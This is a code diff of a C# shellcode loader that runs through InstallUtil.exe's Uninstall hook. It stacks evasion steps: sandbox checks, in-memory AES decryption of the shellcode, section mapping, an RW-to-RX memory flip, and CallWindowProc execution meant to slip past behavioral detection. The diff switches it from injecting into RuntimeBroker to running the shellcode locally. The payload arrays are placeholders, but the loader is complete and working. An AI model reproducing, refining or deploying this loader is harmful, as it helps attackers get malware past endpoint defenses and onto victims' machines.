@@ -4,15 +4,19 @@
 // Executed via: InstallUtil.exe /U loader.exe
 //
 // Evasion layers:
-//   1. Sandbox checks      — FLS callback check + Sleep timing check
-//   2. AES-256-CBC         — shellcode encrypted at build time, decrypted in memory
-//   3. Section injection   — NtCreateSection + NtMapViewOfSection
-//   4. RW→RX transition    — memory starts RW, flipped to RX before execution
-//   5. Callback execution  — CallWindowProc instead of CreateRemoteThread
+//   1. Sandbox checks      - FLS callback check + Sleep timing check
+//   2. AES-256-CBC         - shellcode encrypted at build time, decrypted in memory
+//   3. Section injection   - NtCreateSection + NtMapViewOfSection (local)
+//   4. RW->RX transition    - memory starts RW, flipped to RX before execution
+//   5. Callback execution  - CallWindowProc instead of CreateThread/CreateRemoteThread
 //
-// Use this variant when CreateRemoteThread is being flagged behaviorally.
-// The shellcode address in the remote process is passed as the callback function
-// pointer to CallWindowProc, which invokes it without creating a new thread.
+// Use this variant when thread creation (CreateThread / CreateRemoteThread) is
+// being flagged behaviorally. CallWindowProc invokes the shellcode address as
+// a window procedure callback - no new thread is created at all.
+//
+// NOTE: CallWindowProc executes in the CALLING process. This loader maps the
+// section into the local process and executes the shellcode locally via
+// callback. It does NOT inject into a remote process (unlike section-injection).
 //
 // Build:
 //   1. Generate shellcode:  .\donut-wrapper.ps1 -InputFile payload.exe -OutputFile sc.cs
@@ -25,41 +29,45 @@
 // =============================================================================
 
 using System;
-using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Configuration.Install;
 
 namespace CallbackInjectionLoader
 {
+    // Empty entry point - required for /target:exe compilation.
+    // InstallUtil.exe /U invokes Uninstall(), not Main().
+    internal class Program
+    {
+        static void Main(string[] args) { }
+    }
+
     [System.ComponentModel.RunInstaller(true)]
     public class Sample : System.Configuration.Install.Installer
     {
-        // ── P/Invoke: kernel32 ──────────────────────────────────────────────
+        // -- P/Invoke: kernel32 ----------------------------------------------
         [DllImport("kernel32.dll")] static extern void Sleep(uint dwMilliseconds);
         [DllImport("kernel32.dll", SetLastError=true)] static extern UInt32 FlsAlloc(IntPtr lpCallback);
-        [DllImport("kernel32.dll", SetLastError=true)] static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);
         [DllImport("kernel32.dll")] static extern IntPtr GetCurrentProcess();
 
-        // ── P/Invoke: user32 (callback execution) ───────────────────────────
+        // -- P/Invoke: user32 (callback execution) ---------------------------
         [DllImport("user32.dll", SetLastError=true)]
         static extern IntPtr CallWindowProc(IntPtr lpPrevWndFunc, IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
 
-        // ── P/Invoke: ntdll (section mapping + memory protection) ───────────
+        // -- P/Invoke: ntdll (section mapping + memory protection) -----------
         [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtCreateSection(ref IntPtr hSection, uint dwDesiredAccess, IntPtr lpObjectAttributes, ref ulong ulMaximumSize, uint flProtect, uint dwAllocationAttributes, IntPtr hFile);
-        [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtMapViewOfSection(IntPtr hSection, IntPtr hProcess, ref IntPtr lpBaseAddress, UIntPtr ulZeroBits, UIntPtr ulCommitSize, out ulong plSectionOffset, out uint pulViewSize, uint dwInheritDisposition, uint dwAllocationType, uint flProtect);
+        [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtMapViewOfSection(IntPtr hSection, IntPtr hProcess, ref IntPtr lpBaseAddress, UIntPtr ulZeroBits, UIntPtr ulCommitSize, ref ulong plSectionOffset, ref UIntPtr pulViewSize, uint dwInheritDisposition, uint dwAllocationType, uint flProtect);
         [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtUnmapViewOfSection(IntPtr hProcess, IntPtr lpBaseAddress);
         [DllImport("ntdll.dll", SetLastError=true)] static extern uint NtProtectVirtualMemory(IntPtr hProcess, ref IntPtr lpBaseAddress, ref UIntPtr lplNumberOfBytesToProtect, uint flNewAccessProtection, out uint lpflOldAccessProtection);
         [DllImport("ntdll.dll")] static extern uint NtClose(IntPtr hObject);
 
-        // ── Constants ───────────────────────────────────────────────────────
+        // -- Constants -------------------------------------------------------
         const uint SECTION_ALL_ACCESS   = 0x000F001F;
         const uint SEC_COMMIT           = 0x08000000;
         const uint PAGE_READWRITE       = 0x04;
         const uint PAGE_EXECUTE_READ     = 0x20;
-        const uint PROCESS_ALL_ACCESS   = 0x001F0FFF;
 
-        // ── AES Key / IV / Encrypted Shellcode ──────────────────────────────
+        // -- AES Key / IV / Encrypted Shellcode ------------------------------
         // Generated by aes-encrypt-shellcode.ps1
         // Replace these placeholder arrays with your actual values before compiling.
         private static readonly byte[] AesKey = new byte[32] {
@@ -77,19 +85,16 @@ namespace CallbackInjectionLoader
             0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
         };
 
-        // ── Target process (configurable via INJ_TARGET env var) ────────────
-        private static readonly string TargetProcessName =
-            Environment.GetEnvironmentVariable("INJ_TARGET") ?? "RuntimeBroker";
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            // ── 1. Sandbox checks ───────────────────────────────────────────
+            // -- 1. Sandbox checks -------------------------------------------
             if (FlsAlloc(IntPtr.Zero) == 0xFFFFFFFF) return;
 
             DateTime t1 = DateTime.Now;
             Sleep(2000);
             if (DateTime.Now.Subtract(t1).TotalSeconds < 1.5) return;
 
-            // ── 2. AES decrypt shellcode in memory ──────────────────────────
+            // -- 2. AES decrypt shellcode in memory --------------------------
             byte[] shellcode;
             using (Aes aes = Aes.Create())
             {
@@ -99,44 +104,42 @@ namespace CallbackInjectionLoader
                     shellcode = dec.TransformFinalBlock(EncryptedShellcode, 0, EncryptedShellcode.Length);
             }
 
-            // ── 3. Locate target process ────────────────────────────────────
-            var procs = Process.GetProcessesByName(TargetProcessName);
-            if (procs.Length == 0) return;
-            IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, procs[0].Id);
-            if (hProcess == IntPtr.Zero) return;
-
-            // ── 4. Section injection with RW→RX ─────────────────────────────
+            // -- 3. Section injection (local) with RW->RX ---------------------
             IntPtr hSection = IntPtr.Zero;
             IntPtr localView = IntPtr.Zero;
-            IntPtr remoteView = IntPtr.Zero;
             ulong size = (ulong)shellcode.Length;
-            uint viewSize = 0;
+            UIntPtr viewSize = UIntPtr.Zero;
             ulong offset = 0;
 
+            // Create a section object backed by the pagefile (SEC_COMMIT)
             uint status = NtCreateSection(ref hSection, SECTION_ALL_ACCESS, IntPtr.Zero, ref size, PAGE_READWRITE, SEC_COMMIT, IntPtr.Zero);
             if (status != 0) return;
 
-            status = NtMapViewOfSection(hSection, GetCurrentProcess(), ref localView, UIntPtr.Zero, UIntPtr.Zero, out offset, out viewSize, 1, 0, PAGE_READWRITE);
+            // Map the section into our own process (RW) to write shellcode
+            status = NtMapViewOfSection(hSection, GetCurrentProcess(), ref localView, UIntPtr.Zero, UIntPtr.Zero, ref offset, ref viewSize, 1, 0, PAGE_READWRITE);
             if (status != 0) { NtClose(hSection); return; }
 
-            status = NtMapViewOfSection(hSection, hProcess, ref remoteView, UIntPtr.Zero, UIntPtr.Zero, out offset, out viewSize, 1, 0, PAGE_READWRITE);
-            if (status != 0) { NtUnmapViewOfSection(GetCurrentProcess(), localView); NtClose(hSection); return; }
-
+            // Write decrypted shellcode into the local view
             Marshal.Copy(shellcode, 0, localView, shellcode.Length);
 
-            NtUnmapViewOfSection(GetCurrentProcess(), localView);
+            // Close section handle - the mapped view persists
             NtClose(hSection);
 
-            // ── 5. Flip remote view from RW to RX ───────────────────────────
-            IntPtr protAddr = remoteView;
+            // -- 4. Flip local view from RW to RX ----------------------------
+            IntPtr protAddr = localView;
             UIntPtr protSize = (UIntPtr)shellcode.Length;
             uint oldProt;
-            NtProtectVirtualMemory(hProcess, ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);
+            NtProtectVirtualMemory(GetCurrentProcess(), ref protAddr, ref protSize, PAGE_EXECUTE_READ, out oldProt);
 
-            // ── 6. Execute via callback (no CreateRemoteThread) ─────────────
+            // -- 5. Execute via callback (no CreateThread / CreateRemoteThread) --
             // CallWindowProc invokes the shellcode address as a window procedure
-            // callback. This avoids the CreateRemoteThread behavioral indicator.
-            CallWindowProc(remoteView, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
+            // callback. This avoids both CreateThread and CreateRemoteThread
+            // behavioral indicators. The shellcode runs synchronously in the
+            // calling thread.
+            CallWindowProc(localView, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero);
+
+            // -- 6. Cleanup --------------------------------------------------
+            NtUnmapViewOfSection(GetCurrentProcess(), localView);
         }
     }
 }
